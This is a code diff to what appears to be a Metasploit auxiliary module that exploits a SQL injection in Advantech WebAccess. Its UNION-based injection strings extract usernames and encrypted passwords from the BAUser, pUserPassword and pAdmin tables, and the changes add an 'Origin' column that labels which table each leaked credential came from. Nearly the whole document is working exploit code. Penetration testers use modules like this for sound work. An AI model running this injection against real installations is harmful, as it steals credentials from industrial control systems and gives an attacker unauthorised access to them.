@@ -127,9 +127,9 @@ class Metasploit3 < Msf::Auxiliary
     # according to documentation other backends are supported. This
     # injection should be compatible, hopefully, with most backends.
     injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
-    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from BAUser where #{rand}=#{rand} "
-    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from pUserPassword IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
-    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 from pAdmin IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}BAUser' from BAUser where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}pUserPassword' from pUserPassword IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
+    injection << "union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}pAdmin' from pAdmin IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} "
     injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
     data = do_sqli(injection, mark)
 
@@ -154,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
     users_table = Rex::Ui::Text::Table.new(
       'Header'  => 'Advantech WebAccess Users',
       'Ident'   => 1,
-      'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password']
+      'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password', 'Origin']
     )
 
     for i in 0..@users.length - 1
@@ -182,12 +182,23 @@ class Metasploit3 < Msf::Auxiliary
        :pass => @plain_passwords[i],
        :type => "password",
        :sname => (ssl ? "https" : "http"),
-       :proof => "Leaked encrypted password: #{@users[i][1]}:#{@users[i][2]}"
+       :proof => "Leaked encrypted password from #{@users[i][3]}: #{@users[i][1]}:#{@users[i][2]}"
       })
-      users_table << [@users[i][0], @users[i][1], @users[i][2], @plain_passwords[i]]
+
+      users_table << [@users[i][0], @users[i][1], @users[i][2], @plain_passwords[i], user_type(@users[i][3])]
     end
 
     print_line(users_table.to_s)
+  end
+
+  def user_type(database)
+    user_type = database
+
+    unless database == "BAUser"
+      user_type << " (Web Access)"
+    end
+
+    user_type
   end
 
   def decrypt_password(password, key)
